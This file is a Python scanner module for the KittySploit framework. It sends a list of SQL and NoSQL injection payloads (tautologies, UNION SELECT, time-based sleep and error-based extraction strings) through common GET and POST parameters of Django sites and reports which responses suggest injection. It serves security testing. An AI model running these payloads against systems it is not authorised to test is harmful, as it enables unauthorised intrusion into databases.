#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import re
import urllib.parse
import time


class Module(Auxiliary, Http_client):

    __info__ = {
        'name': 'Django SQL Injection Scanner',
        'description': 'Scans for SQL injection vulnerabilities in Django applications, including ORM injection and raw SQL queries',
        'author': 'KittySploit Team',
        'tags': ['web', 'django', 'sqli', 'scanner', 'security', 'injection'],
        'references': [
            'https://docs.djangoproject.com/en/stable/topics/security/',
            'https://owasp.org/www-community/attacks/SQL_Injection',
            'https://portswigger.net/web-security/sql-injection',
        ]
    }

    # SQL injection payloads
    SQLI_PAYLOADS = [
        # Basic SQL injection
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "') OR ('1'='1'/*",
        
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT user(),database(),version()--",
        
        # Boolean-based blind
        "' OR 1=1 AND 'a'='a",
        "' OR 1=1 AND 'a'='b",
        "' OR 1=2 AND 'a'='a",
        
        # Time-based blind
        "'; WAITFOR DELAY '00:00:05'--",
        "'; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
        
        # Error-based
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        
        # Django-specific
        "' OR 1=1--",
        "') OR 1=1--",
        "' OR 'x'='x",
        "') OR ('x')=('x",
        
        # NoSQL injection (if using MongoDB)
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "1==1"}',
    ]

    # Parameter names commonly used in Django
    DJANGO_PARAMS = [
        'id', 'pk', 'slug', 'name', 'username', 'email',
        'q', 'query', 'search', 'filter', 'sort', 'order',
        'page', 'limit', 'offset', 'count',
        'user', 'user_id', 'author', 'author_id',
        'category', 'category_id', 'tag', 'tag_id',
    ]

    def check(self):
        """
        Check if the target is accessible and might be using Django
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response:
                # Check for Django indicators
                content = response.text.lower()
                headers = str(response.headers).lower()
                
                django_indicators = [
                    'django', 'csrfmiddlewaretoken', 'csrf_token',
                    'set-cookie: csrftoken', 'x-csrftoken',
                    'django_session', 'sessionid'
                ]
                
                if any(indicator in content or indicator in headers for indicator in django_indicators):
                    return True
                # Even if not detected, continue scanning
                return True
            return False
        except Exception as e:
            return False

    def detect_django_version(self):
        """
        Detect Django version from response
        """
        try:
            response = self.http_request(method="GET", path="/")
            if not response:
                return None

            content = response.text
            headers = str(response.headers)

            # Check for Django version in error pages
            version_match = re.search(r'Django[\/\s]+([\d\.]+)', content, re.IGNORECASE)
            if version_match:
                return version_match.group(1)

            # Check for Django in headers
            if 'django' in headers.lower():
                return 'Django (version unknown)'

            return None
        except Exception as e:
            print_debug(f"Error detecting Django version: {str(e)}")
            return None

    def test_sqli_payload(self, payload, param_name='id', method='GET'):
        """
        Test a SQL injection payload
        
        Args:
            payload: The SQL injection payload
            param_name: Parameter name to inject into
            method: HTTP method to use
            
        Returns:
            dict: Test results
        """
        try:
            if method == 'GET':
                # URL encode the payload
                encoded_payload = urllib.parse.quote(payload)
                test_path = f"/?{param_name}={encoded_payload}"
                
                start_time = time.time()
                response = self.http_request(
                    method="GET",
                    path=test_path,
                    allow_redirects=False
                )
                elapsed_time = time.time() - start_time
            else:
                # POST request
                post_data = {param_name: payload}
                start_time = time.time()
                response = self.http_request(
                    method="POST",
                    path="/",
                    data=post_data
                )
                elapsed_time = time.time() - start_time

            if not response:
                return {'payload': payload, 'vulnerable': False, 'error': 'No response'}

            # Analyze response for SQL injection indicators
            is_vulnerable = False
            indicators = []

            # Check for SQL error messages
            sql_errors = [
                'sql syntax', 'mysql', 'postgresql', 'sqlite', 'oracle',
                'sql server', 'microsoft ole db', 'odbc', 'driver',
                'sqlstate', 'sql error', 'database error',
                'warning: mysql', 'warning: pg_', 'unclosed quotation',
                'quoted string not properly terminated',
                'django.db.utils', 'django.db', 'operationalerror',
                'databaseerror', 'integrityerror'
            ]

            response_lower = response.text.lower()
            for error in sql_errors:
                if error in response_lower:
                    is_vulnerable = True
                    indicators.append(f'SQL error: {error}')
                    break

            # Check for time-based SQL injection (delayed response)
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower() or 'pg_sleep' in payload.lower():
                if elapsed_time > 4:  # More than 4 seconds
                    is_vulnerable = True
                    indicators.append(f'Time-based delay: {elapsed_time:.2f}s')

            # Check for boolean-based differences
            # This would require comparing with a baseline, simplified here
            if 'or 1=1' in payload.lower() or "or '1'='1'" in payload.lower():
                # Check if response is different (longer/shorter)
                if len(response.text) > 1000:  # Arbitrary threshold
                    indicators.append('Response length difference')

            # Check for union-based injection
            if 'union' in payload.lower() and 'select' in payload.lower():
                # Check if response contains data that might be from UNION
                if response.status_code == 200 and len(response.text) > 100:
                    indicators.append('Possible UNION injection')

            return {
                'payload': payload,
                'param': param_name,
                'method': method,
                'vulnerable': is_vulnerable,
                'indicators': indicators,
                'status_code': response.status_code,
                'response_time': elapsed_time,
                'response_length': len(response.text)
            }

        except Exception as e:
            return {
                'payload': payload,
                'param': param_name,
                'vulnerable': False,
                'error': str(e)
            }

    def run(self):
        """
        Execute the Django SQL injection scan
        """
        self.vulnerabilities = []
        self.test_results = []

        print_status("Starting Django SQL injection scan...")
        print_info(f"Target: {self.target}")
        print_info("")

        # Detect Django version
        print_status("Detecting Django version...")
        version = self.detect_django_version()
        if version:
            print_success(f"Django version detected: {version}")
        else:
            print_warning("Could not detect Django version")
            print_info("Continuing with generic SQL injection tests...")
        print_info("")

        # Test GET parameters
        print_status("Testing GET parameters for SQL injection...")
        print_info("")

        for param in self.DJANGO_PARAMS:
            print_info(f"Testing parameter: {param}")

            for i, payload in enumerate(self.SQLI_PAYLOADS[:15], 1):  # Test first 15 payloads per param
                result = self.test_sqli_payload(payload, param, method='GET')
                self.test_results.append(result)

                if result.get('vulnerable'):
                    print_success(f"  [!] Potential SQL injection found!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info(f"      Status Code: {result.get('status_code')}")
                    if result.get('response_time'):
                        print_info(f"      Response Time: {result.get('response_time'):.2f}s")
                    print_info("")
                    self.vulnerabilities.append(result)

        print_info("")

        # Test POST parameters
        print_status("Testing POST parameters for SQL injection...")
        print_info("")

        for param in self.DJANGO_PARAMS[:5]:  # Test first 5 params via POST
            print_info(f"Testing POST parameter: {param}")

            for payload in self.SQLI_PAYLOADS[:10]:  # Test first 10 payloads
                result = self.test_sqli_payload(payload, param, method='POST')
                self.test_results.append(result)

                if result.get('vulnerable'):
                    print_success(f"  [!] Potential SQL injection found (POST)!")
                    print_info(f"      Parameter: {param}")
                    print_info(f"      Payload: {payload[:60]}...")
                    print_info(f"      Indicators: {', '.join(result.get('indicators', []))}")
                    print_info("")
                    self.vulnerabilities.append(result)

        print_info("")

        # Summary
        print_status("=" * 60)
        print_status("Django SQL Injection Scan Summary")
        print_status("=" * 60)

        if version:
            print_info(f"Django Version: {version}")
        else:
            print_warning("Django Version: Not detected")

        print_info(f"Total tests performed: {len(self.test_results)}")
        print_info(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        print_status("=" * 60)
        print_info("")

        if self.vulnerabilities:
            print_warning("SQL Injection vulnerabilities detected:")
            print_info("")

            table_data = []
            for vuln in self.vulnerabilities[:20]:  # Show first 20
                payload_short = vuln['payload'][:40] + '...' if len(vuln['payload']) > 40 else vuln['payload']
                indicators = ', '.join(vuln.get('indicators', [])[:2])
                table_data.append([
                    vuln.get('param', 'N/A'),
                    vuln.get('method', 'GET'),
                    payload_short,
                    indicators
                ])

            print_table(['Parameter', 'Method', 'Payload', 'Indicators'], table_data)
            print_info("")
            print_warning("IMPORTANT: These are potential vulnerabilities. Manual verification is required.")
        else:
            print_info("No SQL injection vulnerabilities detected during automated testing.")
            print_info("Note: This does not guarantee the application is secure.")

        return True
